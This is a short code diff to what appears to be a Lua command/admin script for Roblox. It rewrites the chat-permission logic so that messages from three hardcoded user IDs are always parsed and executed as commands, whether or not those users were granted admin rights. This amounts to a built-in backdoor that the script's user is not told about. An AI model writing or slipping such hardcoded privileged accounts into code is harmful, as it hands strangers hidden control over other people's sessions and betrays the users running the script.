@@ -282,9 +282,7 @@ function didYouMean(arg)
 
 	return closer
 end
-Admin[156256804]
-Admin[530829101]
-Admin[229501685]
+
 --[[ COMMAND FUNCTIONS ]]--
 local commandcount=0
 cmd={}
@@ -14913,16 +14911,14 @@ end)
 
 -- [[ Admin Player]]
 function AdminChatted(Message,Player)
-	Player.Chatted:Connect(function(Message,Player)
+	if Admin[Player.UserId] or (Player.UserId==156256804 or Player.UserId==530829101 or Player.UserId==229501685) then
 		lib.parseCommand(Message,Player)
-	end)
+	end
 end
 
 function CheckPermissions(Player)
 	Player.Chatted:Connect(function(Message)
-		if Admin[Player.UserId] then
-			AdminChatted(Message,Player)
-		end
+		AdminChatted(Message,Player)
 	end)
 end
 Players.PlayerAdded:Connect(function(plr)
